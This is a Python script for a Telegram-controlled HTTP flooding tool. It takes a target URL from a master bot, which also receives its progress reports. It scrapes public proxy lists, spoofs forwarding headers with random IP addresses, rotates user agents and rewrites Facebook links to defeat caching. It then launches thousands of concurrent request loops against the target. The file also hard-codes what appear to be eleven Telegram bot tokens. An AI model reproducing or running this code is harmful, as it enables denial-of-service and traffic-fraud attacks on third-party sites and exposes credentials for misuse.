import asyncio
import aiohttp
import random
from aiohttp import web

MASTER_TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
MASTER_ID = 1938591484
SLAVE_ARMY = {
    "S1": "8064983761:AAGEZRc9LASS7Fkifm3C3ebOdykCTTJUZ_0", "S2": "8460123410:AAE61k-8wPWE4hkmOxge802d8k7CTrhcfCE",
    "S3": "8529444938:AAHd0VxfMeMlA3XSu9NH5RiBcUvRW09atgE", "S4": "8500850898:AAEje_m--Tt7eOYjKWwpxXC_BYl2NhiqgVc",
    "S5": "8497321044:AAGGQ2eng3ZgtjOECMRyHO_OJjvSuLTH9RI", "S6": "8201736485:AAGFSv-af1506M9pipoaFbHKQW2vLloIMFk",
    "S7": "8420555273:AAHD4mJVw1wY0_nQVSenIBNEaAomcH98sXo", "S8": "8524480261:AAGCe54hX-9PjDsVQW5whE36kj5IBNmKRKA",
    "S9": "8579851332:AAGSd7Mtze2XfBlFoQWcIL5JrzBiz47qXAI", "S10": "8525114674:AAE7LnGxkqaaL6M0DH25NiU3WYHygWYlON4"
}

class AIP2K_Infinite_Logic:
    def __init__(self):
        self.session = None
        self.target = ""
        self.active = False
        self.proxies = []
        self.stats = {name: {"ok": 0, "no": 0} for name in SLAVE_ARMY}
        self.total_success = 0
        self.last_reported = 0

    async def _fetch_proxies(self):
        urls = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
        ]
        while True:
            temp = []
            for u in urls:
                try:
                    async with self.session.get(u, timeout=10) as r:
                        if r.status == 200: temp.extend((await r.text()).splitlines())
                except: pass
            if temp: self.proxies = list(set(temp))
            await asyncio.sleep(180)

    async def _notify(self, text):
        url = f"https://api.telegram.org/bot{MASTER_TOKEN}/sendMessage"
        try: await self.session.post(url, json={'chat_id': MASTER_ID, 'text': text, 'parse_mode': 'Markdown'})
        except: pass

    def _generate_infinite_ip(self):
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    async def _strike_engine(self, name):
        while self.active and self.target:
            proxy = random.choice(self.proxies) if self.proxies else None
            
            headers = {
                'User-Agent': random.choice([
                    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,600)}.{random.randint(1,99)}",
                    f"Mozilla/5.0 (iPhone; CPU OS {random.randint(15,17)}_0 like Mac OS X) Mobile/15E148",
                    f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}; SM-G{random.randint(100,999)}B) AppleWebKit/537.36"
                ]),
                'X-Forwarded-For': self._generate_infinite_ip(),
                'Client-IP': self._generate_infinite_ip(),
                'Via': f"1.1 {self._generate_infinite_ip()}",
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': f"https://www.google.com/search?q={random.randint(1000,9999)}"
            }
            
            try:
                final_url = self.target.replace("www.facebook", "mbasic.facebook")
                if "?" in final_url:
                    final_url += f"&refid={random.randint(1,99)}&_rdc={random.randint(1000,9999)}"
                else:
                    final_url += f"?_rdc={random.randint(1000,9999)}"

                async with self.session.get(final_url, headers=headers, proxy=f"http://{proxy}" if proxy else None, timeout=12) as r:
                    if r.status == 200:
                        self.stats[name]["ok"] += 1
                        self.total_success += 1
                        if self.total_success - self.last_reported >= 500:
                            self.last_reported = self.total_success
                            msg = f"🔱 **AUTO-REPORT: {self.total_success}**\nTarget: `{self.target}`"
                            asyncio.create_task(self._notify(msg))
                    else:
                        self.stats[name]["no"] += 1
            except:
                self.stats[name]["no"] += 1
            
            await asyncio.sleep(random.uniform(0.01, 0.1))

    async def handle_updates(self):
        offset = 0
        asyncio.create_task(self._fetch_proxies())
        await self._notify("🔱 **AIP2K INFINITE CORE ONLINE**")
        while True:
            try:
                url = f"https://api.telegram.org/bot{MASTER_TOKEN}/getUpdates?offset={offset}"
                async with self.session.get(url) as r:
                    data = await r.json()
                    for u in data.get('result', []):
                        offset = u['update_id'] + 1
                        m = u.get('message', {})
                        t = m.get('text', '')
                        if m.get('from', {}).get('id') != MASTER_ID: continue
                        
                        if t.startswith("http"):
                            self.target = t; self.active = True; self.total_success = 0; self.last_reported = 0
                            await self._notify("⚔️ **INFINITE STRIKE STARTED**")
                            for name in SLAVE_ARMY:
                                for _ in range(350): asyncio.create_task(self._strike_engine(name))
                        elif t == "/status":
                            res = f"📊 **STATUS**\nOK: `{self.total_success}`"
                            await self._notify(res)
                        elif t == "/stop":
                            self.active = False; await self._notify("🛑 **STOPPED**")
            except: await asyncio.sleep(1)

async def main():
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as sess:
        bot = AIP2K_Infinite_Logic(); bot.session = sess
        app = web.Application(); runner = web.AppRunner(app)
        await runner.setup(); await web.TCPSite(runner, '0.0.0.0', 10000).start()
        await bot.handle_updates()

if __name__ == "__main__":
    asyncio.run(main())
    
